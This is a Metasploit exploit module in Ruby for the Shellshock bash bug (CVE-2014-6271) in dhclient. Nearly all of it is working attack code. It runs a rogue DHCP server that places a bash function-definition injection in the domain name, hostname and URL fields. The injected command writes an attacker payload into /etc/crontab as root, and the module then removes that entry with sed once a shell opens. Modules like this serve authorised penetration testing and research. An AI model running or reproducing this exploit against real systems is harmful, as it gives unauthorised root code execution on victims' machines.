##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex/proto/dhcp'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::DHCPServer

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Dhclient Bash Environment Variable Injection',
      'Description'    => %q|
        When bash is started with an environment variable that begins with the
        string "() {", that variable is treated as a function definition and
        parsed as code. If extra commands are added after the function
        definition, they will be executed immediately. When dhclient receives
        an ACK that contains a domain name or hostname, they are passed to
        configuration scripts as environment variables, allowing us to trigger
        the bash bug.

        Because of the length restrictions and unusual networking scenario at
        time of exploitation, we achieve code execution by echoing our payload
        into /etc/crontab and clean it up when we get a shell.
      |,
      'Author'         =>
        [
          'Stephane Chazelas', # Vulnerability discovery
          'egypt' # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'Platform'       => ['unix'],
      'Arch'           => ARCH_CMD,
      'References'     =>
        [
          ['CVE', '2014-6271']
        ],
      'Payload'        =>
        {
          # 255 for a domain name, minus some room for encoding
          'Space'       => 200,
          'DisableNops' => true,
          'Compat'      =>
            {
              'PayloadType' => 'cmd',
              'RequiredCmd' => 'generic bash telnet ruby',
            }
        },
      'Targets'        => [ [ 'Automatic Target', { }] ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Sep 24 2014'
    ))

    deregister_options('DOMAINNAME', 'HOSTNAME', 'URL')
  end

  def on_new_session(session)
    print_status "Cleaning up crontab"
    # XXX this will brick a server some day
    session.shell_command_token("sed -i '/^\\* \\* \\* \\* \\* root/d' /etc/crontab")
  end

  def exploit
    hash = datastore.copy
    # Quotes seem to be completely stripped, so other characters have to be
    # escaped
    p = payload.encoded.gsub(/([<>()|'&;$])/) { |s| Rex::Text.to_hex(s) }
    echo = "echo -e #{(Rex::Text.to_hex("*") + " ") * 5}root #{p}>>/etc/crontab"
    hash['DOMAINNAME'] = "() { :; };#{echo}"
    if hash['DOMAINNAME'].length > 255
      raise ArgumentError, 'payload too long'
    end

    hash['HOSTNAME'] = "() { :; };#{echo}"
    hash['URL'] = "() { :; };#{echo}"
    start_service(hash)

    begin
      while @dhcp.thread.alive?
        sleep 2
      end
    ensure
      stop_service
    end
  end

end
